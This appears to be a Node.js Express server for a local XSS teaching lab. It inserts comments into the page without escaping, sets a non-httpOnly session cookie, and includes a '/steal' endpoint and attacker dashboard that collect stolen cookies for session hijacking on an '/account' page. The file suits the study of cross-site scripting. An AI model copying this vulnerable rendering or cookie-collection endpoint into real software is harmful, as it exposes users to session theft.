const express = require('express');
const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

let comments = [];
let stolenCookies = [];

// Pretend "database" of one valid session, tied to a username
let validSessions = {
  'FAKE-SESSION-ABC123': 'victim_user'
};

app.get('/', (req, res) => {
  res.cookie('sessionId', 'FAKE-SESSION-ABC123', { httpOnly: false });

  let commentsHtml = comments.map(c => `<div class="comment"><b>${c.name}:</b> ${c.message}</div>`).join('');

  const fs = require('fs');
  let page = fs.readFileSync('comments.html', 'utf8');
  page = page.replace('<!-- COMMENTS_GO_HERE -->', commentsHtml);

  res.send(page);
});

app.post('/comment', (req, res) => {
  const { name, message } = req.body;
  comments.push({ name: name, message: message });
  res.redirect('/');
});

app.get('/steal', (req, res) => {
  const stolenData = req.query.data;
  stolenCookies.push({ data: stolenData, time: new Date().toISOString() });
  console.log('🎯 STOLEN COOKIE RECEIVED:', stolenData);
  res.status(204).send();
});

app.get('/attacker-dashboard', (req, res) => {
  res.json(stolenCookies);
});

// NEW: a "protected" page — only accessible with a valid session cookie
app.get('/account', (req, res) => {
  // Parse the cookie header manually (no cookie-parser library needed for this demo)
  const cookieHeader = req.headers.cookie || '';
  const match = cookieHeader.match(/sessionId=([^;]+)/);
  const sessionId = match ? match[1] : null;

  const username = validSessions[sessionId];

  if (username) {
    res.send(`<h1>Welcome, ${username}!</h1><p>This is your private account page.</p><p>Session used: ${sessionId}</p>`);
  } else {
    res.status(401).send('<h1>401 Unauthorized</h1><p>No valid session.</p>');
  }
});

app.listen(PORT, () => {
  console.log(`XSS Lab server running at http://localhost:${PORT}`);
});